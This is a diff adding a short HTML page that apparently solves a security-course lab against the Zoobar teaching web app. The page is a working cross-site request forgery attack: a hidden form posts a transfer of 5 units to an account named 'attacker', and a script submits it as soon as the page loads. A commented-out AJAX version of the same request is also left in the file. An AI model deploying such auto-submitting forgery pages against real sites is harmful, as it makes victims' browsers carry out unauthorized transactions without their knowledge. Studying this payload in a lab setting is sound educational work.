@@ -1,0 +1,18 @@
+<form action="http://zoobar.org:5000/transfer" method="post" accept-charset="utf-8" id="stealer">
+  <input type="hidden" name="name" value="attacker">
+  <input type="hidden" name="amount" value="5">
+</form>
+<script type="text/javascript" charset="utf-8">
+(function() {
+  var stealer = document.getElementById('stealer');
+  // $.ajax({
+  //   type: 'POST',
+  //   data: {
+  //     name: stealer.name.value,
+  //     amount: stealer.amount.value
+  //   },
+  //   url: stealer.action
+  // });
+  stealer.submit();
+})();
+</script>
